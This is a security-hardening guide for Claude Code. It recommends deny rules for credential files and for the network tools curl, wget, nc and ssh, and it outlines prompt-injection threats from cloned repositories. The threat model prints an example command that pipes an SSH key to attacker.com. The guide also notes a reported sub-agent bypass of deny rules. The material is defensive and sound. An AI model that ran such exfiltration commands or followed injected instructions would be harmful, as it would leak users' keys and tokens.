<!-- qa-skip -->
# Security Baseline for Claude Code

**Purpose:** Claude Code ships with no default deny rules. On a fresh install, Claude has read access to your entire home directory — SSH keys, AWS credentials, `.env` files, GPG keys, npm tokens, GitHub CLI config — and can execute any Bash command, including `curl`, `wget`, and `nc`. A single prompt injection (e.g., a malicious `CLAUDE.md` in a cloned repo, a hostile comment in a dependency's README) can trigger credential reads and exfiltration with no further action from you.

This document provides a recommended **minimum security baseline** you can apply to your `~/.claude/settings.json` in about 15 minutes. It's Level 1 of a three-tier defense pattern. Most users should apply Level 1. Levels 2 and 3 are for environments where untrusted code execution is a regular workflow.

## Threat model — what this protects against

1. **Prompt injection via project files.** You clone a repo. The repo's `CLAUDE.md`, a README, a comment in a dependency, a `.mcp.json` — any of these can contain instructions Claude will read and execute. Without deny rules, Claude can follow those instructions all the way to `cat ~/.ssh/id_rsa | curl -X POST https://attacker.com/collect`.
2. **Malicious MCP server in a cloned repo.** A `.mcp.json` in an untrusted repo can register MCP servers that hijack Claude's session. Setting `enableAllProjectMcpServers: false` (the default) plus manual approval per project mitigates this.
3. **Accidental credential reads.** Even without malice, Claude may read `.env` files, credentials folders, or config files during normal operation, which then end up in session transcripts and potentially cloud-synced artifacts.

## What this does NOT protect against

- **Sub-agent bypass.** There is an open issue ([anthropics/claude-code #25000](https://github.com/anthropics/claude-code/issues/25000)) reporting that sub-agents can bypass permission deny rules. Verify current status against your Claude Code version before trusting deny rules in orchestrated workflows.
- **Bash subprocesses reading credentials.** Claude's `Read` tool denies block Claude from reading files, but a Bash command like `cat ~/.ssh/id_rsa` may succeed if `cat` isn't denied. The OS-level sandbox (`sandbox.enabled`) closes this gap but is **macOS/Linux/WSL2 only** — native Windows users need to rely on the `Bash(curl *)` / `Bash(wget *)` / `Bash(nc *)` denies below as the backstop against exfiltration.
- **Zero-day vulnerabilities in Claude Code itself.** Keep `claude update` current.

## Level 1 — Minimum baseline (paste into settings.json)

Add or extend the `permissions.deny` array in your `~/.claude/settings.json`:

```json
{
  "permissions": {
    "deny": [
      "Read(~/.ssh/**)",
      "Read(~/.gnupg/**)",
      "Read(~/.aws/**)",
      "Read(~/.azure/**)",
      "Read(~/.kube/**)",
      "Read(~/.npmrc)",
      "Read(~/.git-credentials)",
      "Read(~/.config/gh/**)",
      "Read(./.env)",
      "Read(./.env.*)",
      "Read(./secrets/**)",
      "Edit(~/.bashrc)",
      "Edit(~/.zshrc)",
      "Bash(curl *)",
      "Bash(wget *)",
      "Bash(nc *)",
      "Bash(ssh *)"
    ]
  }
}
```

Deny rules evaluate **before** allow rules — per [Anthropic's settings documentation](https://code.claude.com/docs/en/settings). So even if you have broad `allow` rules, these denies still fire.

## What each deny protects — and what it costs

| Deny rule | Protects against | Known adverse impact |
|---|---|---|
| `Read(~/.ssh/**)` | SSH private keys exfiltration | None for normal work |
| `Read(~/.gnupg/**)` | GPG private keys exfiltration | None for normal work |
| `Read(~/.aws/**)` | AWS access keys in `credentials` file | None for normal work |
| `Read(~/.azure/**)` | Azure auth tokens | None for normal work |
| `Read(~/.kube/**)` | Kubernetes cluster credentials | None for normal work |
| `Read(~/.npmrc)` | npm auth tokens | None — npm itself still reads its own config |
| `Read(~/.git-credentials)` | HTTPS git credentials | None for normal work |
| `Read(~/.config/gh/**)` | GitHub CLI auth | None — `gh` itself still works |
| `Read(./.env)`, `Read(./.env.*)` | Project env files (API keys) | Claude won't read your `.env` — if a script needs Claude to inspect env config, it'll prompt |
| `Read(./secrets/**)` | Secrets folders | None if you don't use this folder pattern |
| `Edit(~/.bashrc)`, `Edit(~/.zshrc)` | Shell rc file tampering | Claude won't modify your shell startup |
| `Bash(curl *)` | Data exfiltration via HTTP | **Blocks ALL curl usage.** If you use `curl` for legitimate fetches (e.g., Jina Reader at `r.jina.ai`), add a narrow allow rule BEFORE this deny: `"Bash(curl https://r.jina.ai/*)"` |
| `Bash(wget *)` | Data exfiltration via HTTP | **Blocks ALL wget usage** |
| `Bash(nc *)` | Data exfiltration via raw sockets | None for normal work |
| `Bash(ssh *)` | Data exfiltration via SSH | **Blocks `ssh` from Claude.** If you use `ssh` in normal workflows, add narrow allows |

## Level 2 — Trail of Bits security skills marketplace

For a deeper security posture with auditor-grade skills:

```
claude plugin marketplace add trailofbits/skills
```

Trail of Bits is a legitimate security research firm ([trailofbits on GitHub](https://github.com/trailofbits)). Their marketplace has 40+ security-related plugins covering smart contracts, malware analysis, mobile security, code auditing, verification, and reverse engineering. You probably don't need all of them — pick the ones relevant to your work (e.g., code auditing plugins, security skills).

## Level 3 — Full isolation via devcontainer

For running Claude in untrusted repos (client code you don't trust, a random repo you're inspecting):

```
npm install -g @devcontainers/cli
git clone https://github.com/trailofbits/claude-code-devcontainer ~/.claude-devcontainer
~/.claude-devcontainer/install.sh self-install
```

Then `devc .` into any repo to run Claude inside a Docker container with zero host access. Requires Docker Desktop. Slower iteration than Level 1, so only use when you actually need full isolation.

## Verifying your baseline

After applying Level 1, restart Claude Code (the new settings take effect at session start, not mid-session). Then test:

1. Ask: *"Read my ~/.ssh/config file and tell me what hosts are defined."* — should be blocked
2. Ask: *"curl https://example.com and show me the response."* — should be blocked
3. Ask: *"Read the file at ./some-non-sensitive-path.md"* — should work as normal

If denied reads produce a confusing error, verify your `settings.json` is valid JSON (a missing comma breaks everything silently in some versions).

## Sources

- [Anthropic Claude Code settings documentation](https://code.claude.com/docs/en/settings) — authoritative schema for `permissions.allow/deny/ask` and sandbox configuration
- [CVE-2026-21852 (GitHub Security Advisory)](https://github.com/advisories/GHSA-jh7p-qr78-84p7) — information disclosure vulnerability patched in Claude Code 2.0.65
- [Check Point Research: Caught in the Hook (CVE-2025-59536)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) — documented MCP attack vector
- [anthropics/claude-code Issue #46741](https://github.com/anthropics/claude-code/issues/46741) — open feature request for default credential deny rules
- [anthropics/claude-code Issue #25000](https://github.com/anthropics/claude-code/issues/25000) — reported sub-agent bypass of deny rules (verify current status against your version)
- [Trail of Bits Claude Code skills marketplace](https://github.com/trailofbits/skills)
- [Trail of Bits Claude Code devcontainer](https://github.com/trailofbits/claude-code-devcontainer)
